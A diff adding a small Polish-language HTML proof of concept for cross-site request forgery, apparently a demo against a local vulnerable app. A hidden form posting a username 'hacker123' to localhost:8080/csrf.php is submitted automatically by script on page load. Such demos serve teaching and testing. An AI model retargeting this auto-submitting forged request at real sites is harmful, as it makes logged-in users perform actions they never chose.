@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Atak CSRF - PoC</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; }
+        h1 { color: #dc3545; }
+    </style>
+</head>
+<body>
+    <h1>😈 Atak CSRF w toku...</h1>
+    <p>Jeśli jesteś zalogowany w demo, akcja wykona się automatycznie.</p>
+
+    <!-- Formularz atakujący wersję podatną -->
+    <form id="csrfForm" action="http://localhost:8080/csrf.php" method="POST">
+        <input type="hidden" name="action_type" value="safe">
+        <input type="hidden" name="username" value="hacker123">
+    </form>
+
+    <script>
+        // Automatyczne wysłanie formularza zaraz po załadowaniu strony
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
